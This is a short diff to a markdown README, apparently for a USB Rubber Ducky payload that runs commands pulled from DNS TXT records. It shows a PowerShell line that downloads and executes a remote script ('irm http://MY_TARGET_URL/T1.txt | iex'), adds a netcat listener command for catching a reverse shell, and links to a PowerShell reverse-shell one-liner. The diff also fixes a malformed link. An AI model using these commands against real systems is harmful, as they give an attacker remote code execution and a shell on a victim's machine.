@@ -35,11 +35,15 @@ irm http://MY_TARGET_URL/T1.txt | iex
 ```Powershell
 gc -raw .\convertBase64.ps1 | iex
 ```
+## Linux Commands
+```bash
+nc -lvnp 1337
+```
 ### Links
 
 [Powershell Reverseshell One-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
 
-[Convert to base64]([https://pypi.org/project/uploadserver/](https://github.com/nathansb2022/usbrubberducky-payloads/blob/master/payloads/library/execution/DNS-TXT-CommandInection/convertBase64.ps1))
+[Convert to base64](https://github.com/nathansb2022/usbrubberducky-payloads/blob/master/payloads/library/execution/DNS-TXT-CommandInection/convertBase64.ps1)
 
 [Create TXT record in AWS Route53](https://www.entrust.com/knowledgebase/ssl/how-to-create-a-txt-record-on-amazon-aws-route-53-for-entrust-email-validation-method)
 
